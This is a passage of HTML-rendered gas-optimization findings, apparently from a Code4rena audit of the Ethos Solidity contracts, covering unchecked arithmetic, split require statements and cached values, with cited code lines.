class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">194</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">totalAllocBPS</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">strategies</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_strategy</span><span class=\"mtk1\">].</span><span class=\"mtk12\">allocBPS</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">196</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">totalAllocBPS</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">_allocBPS</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">214</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">totalAllocBPS</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">strategies</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_strategy</span><span class=\"mtk1\">].</span><span class=\"mtk12\">allocBPS</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">396</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">totalAllocated</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">actualWithdrawn</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">445</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">totalAllocBPS</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">bpsChange</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">452</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">totalAllocated</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">loss</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">515</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">totalAllocated</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">debtPayment</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">521</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">totalAllocated</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">credit</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<h2 id=\"using-unchecked-blocks-to-save-gas\" style=\"position:relative;\"><a href=\"#using-unchecked-blocks-to-save-gas\" aria-label=\"using unchecked blocks to save gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Using unchecked blocks to save gas</h2>\n<p>Solidity version 0.8+ comes with implicit overflow and underflow checks on unsigned integers. When an overflow or an underflow isn’t possible (as an example, when a comparison is made before the arithmetic operation), some gas can be saved by using an unchecked block.<br>\n<a href=\"https://github.com/ethereum/solidity/issues/10695\">see resource</a></p>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperVaultV2.sol#L235\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperVaultV2.sol#L235</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"145\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">Ethos</span><span class=\"mtk1\">-</span><span class=\"mtk12\">Vault</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ReaperVaultV2</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">235</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> -</span><span class=\"mtk11\">int256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stratCurrentAllocation</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">stratMaxAllocation</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>The operation <code>stratCurrentAllocation - stratMaxAllocation</code> cannot underflow due to the check on <a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperVaultV2.sol#L234\">Line 234</a> that ensures that the operation would only be performed if <code>stratCurrentAllocation</code> is greater than <code>stratMaxAllocation</code>.</p>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperVaultV2.sol#L244\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperVaultV2.sol#L244</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"146\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">Ethos</span><span class=\"mtk1\">-</span><span class=\"mtk12\">Vault</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ReaperVaultV2</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">244</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">available</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">stratMaxAllocation</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">stratCurrentAllocation</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>The operation <code>stratMaxAllocation - stratCurrentAllocation</code> cannot underflow due to the check on <a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperVaultV2.sol#L236\">Line 236</a> that ensures that <code>stratMaxAllocation</code> is greater than <code>stratCurrentAllocation</code> before performing the arithmetic operation.</p>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperVaultV2.sol#L245\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperVaultV2.sol#L245</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"147\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">Ethos</span><span class=\"mtk1\">-</span><span class=\"mtk12\">Vault</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ReaperVaultV2</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">245</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">available</span><span class=\"mtk1\"> = </span><span class=\"mtk10\">Math</span><span class=\"mtk1\">.</span><span class=\"mtk11\">min</span><span class=\"mtk1\">(</span><span class=\"mtk12\">available</span><span class=\"mtk1\">, </span><span class=\"mtk12\">vaultMaxAllocation</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">vaultCurrentAllocation</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>The operation <code>vaultMaxAllocation - vaultCurrentAllocation</code> cannot underflow due to the check on <a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperVaultV2.sol#L240\">Line 240</a> that ensures that <code>vaultMaxAllocation</code> is greater than <code>vaultCurrentAllocation</code> before performing our arithmetic operation.</p>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperVaultV2.sol#L384\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperVaultV2.sol#L384</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"148\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">Ethos</span><span class=\"mtk1\">-</span><span class=\"mtk12\">Vault</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ReaperVaultV2</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">384</span><span class=\"mtk1\">:                </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">remaining</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">value</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">vaultBalance</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>The operation <code>value - vaultBalance</code> cannot underflow due to the check on <a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperVaultV2.sol#L374\">Line 374</a> that ensures that if <code>value</code> is less than <code>vaultBalance</code>, the loop would break out and our operation would never be performed.</p>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperStrategyGranarySupplyOnly.sol#L81\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperStrategyGranarySupplyOnly.sol#L81</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"149\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">Ethos</span><span class=\"mtk1\">-</span><span class=\"mtk12\">Vault</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ReaperStrategyGranarySupplyOnly</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">81</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">toReinvest</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">wantBalance</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">_debt</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>The operation <code>wantBalance - _debt</code> cannot underflow due to the check on <a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperStrategyGranarySupplyOnly.sol#L80\">Line 80</a> that ensures that <code>wantBalance</code> is greater than <code>_debt</code> before performing the arithmetic operation.</p>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperStrategyGranarySupplyOnly.sol#L93\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperStrategyGranarySupplyOnly.sol#L93</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"150\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">Ethos</span><span class=\"mtk1\">-</span><span class=\"mtk12\">Vault</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ReaperStrategyGranarySupplyOnly</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">93</span><span class=\"mtk1\">:            </span><span class=\"mtk11\">_withdraw</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_amountNeeded</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">wantBal</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>The operation <code>_amountNeeded - wantBal</code> cannot underflow due to the check on <a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperStrategyGranarySupplyOnly.sol#L92\">Line 92</a> that ensures that <code>_amountNeeded</code> is greater than <code>wantBal</code> before performing the arithmetic operation.</p>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperStrategyGranarySupplyOnly.sol#L100\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperStrategyGranarySupplyOnly.sol#L100</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"151\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">Ethos</span><span class=\"mtk1\">-</span><span class=\"mtk12\">Vault</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ReaperStrategyGranarySupplyOnly</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">100</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">loss</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_amountNeeded</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">liquidatedAmount</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>The operation <code>_amountNeeded - liquidatedAmount</code> cannot underflow due to the check on <a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperStrategyGranarySupplyOnly.sol#L99\">Line 99</a> that ensures that <code>_amountNeeded</code> is greater than <code>liquidatedAmount</code> before performing the arithmetic operation.</p>\n<h2 id=\"splitting-require-statements-that-use--saves-gas---saves-8-gas-per-\" style=\"position:relative;\"><a href=\"#splitting-require-statements-that-use--saves-gas---saves-8-gas-per-\" aria-label=\"splitting require statements that use  saves gas   saves 8 gas per  permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Splitting require() statements that use &#x26;&#x26; saves gas - (saves 8 gas per &#x26;&#x26;)</h2>\n<p>Instead of using the &#x26;&#x26; operator in a single require statement to check multiple conditions,using multiple require statements with 1 condition per require statement will save 8 GAS per <code>&#x26;&#x26;</code>.</p>\n<p>The gas difference would only be realized if the revert condition is realized(met).</p>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/BorrowerOperations.sol#L653-L654\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/BorrowerOperations.sol#L653-L654</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"152\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">Ethos</span><span class=\"mtk1\">-</span><span class=\"mtk12\">Core</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">BorrowerOperations</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">653</span><span class=\"mtk1\">:            </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_maxFeePercentage</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">BORROWING_FEE_FLOOR</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">_maxFeePercentage</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">DECIMAL_PRECISION</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">654</span><span class=\"mtk1\">:                </span><span class=\"mtk8\">&quot;Max fee percentage must be between 0.5% and 100%&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/TroveManager.sol#L1539\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/TroveManager.sol#L1539</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"153\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">Ethos</span><span class=\"mtk1\">-</span><span class=\"mtk12\">Core</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">TroveManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">1539</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">TroveOwnersArrayLength</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">sortedTroves</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getSize</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">) &gt; </span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/LUSDToken.sol#L347-L351\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/LUSDToken.sol#L347-L351</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"154\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">Ethos</span><span class=\"mtk1\">-</span><span class=\"mtk12\">Core</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LUSDToken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">347</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">348</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">_recipient</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">) &amp;&amp; </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">349</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">_recipient</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">350</span><span class=\"mtk1\">:            </span><span class=\"mtk8\">&quot;LUSD: Cannot transfer tokens directly to the LUSD token contract or the zero address&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">351</span><span class=\"mtk1\">:        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">352</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">353</span><span class=\"mtk1\">:            !</span><span class=\"mtk12\">stabilityPools</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_recipient</span><span class=\"mtk1\">] &amp;&amp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">354</span><span class=\"mtk1\">:            !</span><span class=\"mtk12\">troveManagers</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_recipient</span><span class=\"mtk1\">] &amp;&amp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">355</span><span class=\"mtk1\">:            !</span><span class=\"mtk12\">borrowerOperations</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_recipient</span><span class=\"mtk1\">],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">356</span><span class=\"mtk1\">:            </span><span class=\"mtk8\">&quot;LUSD: Cannot transfer tokens directly to the StabilityPool, TroveManager or BorrowerOps&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">357</span><span class=\"mtk1\">:        );</span></span></span></code></pre>\n<h2 id=\"use-the-cached-value-in-the-following-to-save-gas\" style=\"position:relative;\"><a href=\"#use-the-cached-value-in-the-following-to-save-gas\" aria-label=\"use the cached value in the following to save gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Use the cached value in the following to save gas.</h2>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/ActivePool.sol#L171-L188\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/ActivePool.sol#L171-L188</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"155\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">Ethos</span><span class=\"mtk1\">-</span><span class=\"mtk12\">Core</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ActivePool</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">171</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">sendCollateral</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_account</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">179</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_account</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">defaultPoolAddress</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">180</span><span class=\"mtk1\">:            </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeIncreaseAllowance</span><span class=\"mtk1\">(</span><span class=\"mtk12\">defaultPoolAddress</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">181</span><span class=\"mtk1\">:    </span><span class=\"mtk11\">IDefaultPool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">defaultPoolAddress</span><span class=\"mtk1\">).</span><span class=\"mtk11\">pullCollateralFromActivePool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">182</span><span class=\"mtk1\">:        } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_account</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">collSurplusPoolAddress</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">183</span><span class=\"mtk1\">:            </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeIncreaseAllowance</span><span class=\"mtk1\">(</span><span class=\"mtk12\">collSurplusPoolAddress</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">);         </span><span class=\"mtk7\">184</span><span class=\"mtk1\">: </span><span class=\"mtk11\">ICollSurplusPool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">collSurplusPoolAddress</span><span class=\"mtk1\">).</span><span class=\"mtk11\">pullCollateralFromActivePool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">185</span><span class=\"mtk1\">:        } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">186</span><span class=\"mtk1\">:            </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransfer</span><span 